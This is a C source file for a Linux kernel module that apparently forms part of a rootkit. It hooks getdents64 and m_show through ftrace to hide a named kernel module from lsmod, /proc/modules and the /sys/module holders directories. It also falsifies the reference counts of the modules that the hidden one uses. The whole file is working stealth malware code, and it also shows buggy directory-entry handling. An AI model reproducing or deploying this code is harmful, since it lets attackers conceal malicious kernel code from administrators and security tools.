#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/ftrace.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/jiffies.h>
#include <stdbool.h>
#include <linux/sched.h>
#include <linux/wait.h>
#include "../common/ftrace_hooking/ftrace_hook.h"
#include "../common/waitable_counters/waitable_counter.h"

static char *mod_name_to_hide;
module_param(mod_name_to_hide, charp, 0600);
static char *sys_modules_path = "/sys/module/";

#pragma region hook_consts
// get_dents64 hook
typedef int (*original_getdents64_t)(const struct pt_regs *regs);
static struct fthook getdents64_hook;
static char *holders_path = "/holders";

// m_show hook
typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
static struct fthook m_show_hook;
static LIST_HEAD(used_by_hidden_list);
#pragma endregion hook_consts

#pragma region utils
struct mod_list_entry {
    struct module *mod;
    struct list_head list;
};

/* Does a already use b?
   Copied from module.c, as that function is not exported.
   Requires module mutex */
bool already_uses(struct module *a, struct module *b)
{
	struct module_use *use;

	list_for_each_entry(use, &b->source_list, source_list) {
		if (use->source == a) {
			return true;
		}
	}
    
	return false;
}

/*  Gets refcnt by iterating through the target list of the module struct 
    Requires module mutex */
int get_actual_refcnt(struct module *a) {
	struct module_use *use;
    int refcnt = 1; // Module ref base is equal to 1.

	list_for_each_entry(use, &a->source_list, source_list) {
        pr_info("refcnt: %s", use->source->name);
        refcnt++;
	}

    return refcnt + 1; 
}

bool already_in_list(struct module *mod) {
    struct mod_list_entry *entry;
    list_for_each_entry(entry, &used_by_hidden_list, list) {
        if (!strcmp(entry->mod->name, mod->name)) {
            return true;
        }
    }

    return false;
}
#pragma endregion utils

#pragma region get_dents64_hook
int new_getdents64(const struct pt_regs *regs) {
    original_getdents64_t original_getdents64_ptr = (original_getdents64_t)getdents64_hook.original_function_address;
    int total_bytes_read = original_getdents64_ptr(regs);

    if (total_bytes_read > 0) {
        struct linux_dirent64 *buf_pointer = (struct linux_dirent64*)regs->si;
        struct linux_dirent64 *first = kmalloc(total_bytes_read, GFP_KERNEL);

        int copy_res = copy_from_user(first, buf_pointer, (unsigned long)total_bytes_read);
        if (copy_res) {
            pr_warn("Error while copying from user space! error %d", copy_res);
            return total_bytes_read;
        }

        struct linux_dirent64 *curr = first;

        int bytes_left = total_bytes_read;
        bool has_been_found = false;
        while (bytes_left > 0) { 
            bytes_left -= curr->d_reclen;
            curr = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);

            struct file *file = fget((int)regs->di);
            if (file == NULL) {
                continue;
            }

            char *allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
            char *path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);

            if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
                pr_info("Hiding %s from %s using get_dents64", mod_name_to_hide, path);    
                has_been_found = true;

                // Array will be shortened by the length of the member we will delete.
                total_bytes_read -= curr->d_reclen;
                bytes_left -= curr->d_reclen;
                
                struct linux_dirent64 *next_pos = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);
                memmove(curr, next_pos, bytes_left);
            }

            kfree(allocated_path_pointer);
            fput(file);
        }
        
        if (has_been_found) {
            copy_to_user(buf_pointer, first, total_bytes_read);
        }

        kfree(first);
    }

    return total_bytes_read;
}
#pragma endregion get_dents64_hook

#pragma region m_show_hook
int new_m_show(struct seq_file *m, void *p) {
    original_m_show_t original_m_show_ptr = (original_m_show_t)m_show_hook.original_function_address;

    struct module *current_module = list_entry(p, struct module, list);
    if (!strcmp(current_module->name, mod_name_to_hide)) {
        pr_info("Hiding %s from m_show", current_module->name);
        return 0;
    }
    
    // When called, this function already has the module mutex. As such, there's no need to acquire it when using the helper functions.
    struct module *module_to_hide = find_module(mod_name_to_hide);
    bool is_in_use = already_uses(module_to_hide, current_module);

    if (is_in_use && !already_in_list(current_module)) {
        struct mod_list_entry *new_entry = kmalloc(sizeof(struct mod_list_entry), GFP_KERNEL);
        new_entry->mod = current_module;
        INIT_LIST_HEAD(&new_entry->list);

        list_add_tail(&new_entry->list, &used_by_hidden_list);

        int actual_refcnt = get_actual_refcnt(current_module);
        int modified_refcnt = actual_refcnt - 1;
        atomic_set(&current_module->refcnt, modified_refcnt);
    }

    return original_m_show_ptr(m, p);
}
#pragma endregion m_show_hook

int load(void) {
    pr_info("Initializing...");
    if (mod_name_to_hide == NULL) {
        pr_warn("Mod name to hide has not been set! Exiting...");
        return -EINVAL;
    }

    int m_show_res = setup_kernel_func_hook(&m_show_hook, "m_show", (unsigned long)new_m_show);
    if (m_show_res) {
        return m_show_res;
    }

    int getdents_res = setup_syscall_hook(&getdents64_hook,__NR_getdents64, (unsigned long)new_getdents64);
    if (getdents_res) {
        return getdents_res;
    }

    pr_info("Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    pr_info("Shutting down.");

    remove_hook(&m_show_hook);
    remove_hook(&getdents64_hook);

    struct list_head *pos;
    struct list_head *tmp;
    list_for_each_safe(pos, tmp, &used_by_hidden_list) {
        struct mod_list_entry *entry = list_entry(pos, struct mod_list_entry, list);

        struct module *mod = entry->mod;
        mutex_lock(&module_mutex);
        int actual_refcnt = get_actual_refcnt(mod);
        atomic_set(&mod->refcnt, actual_refcnt);
        mutex_unlock(&module_mutex);

        list_del(&entry->list);
        kfree(entry);
    }
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");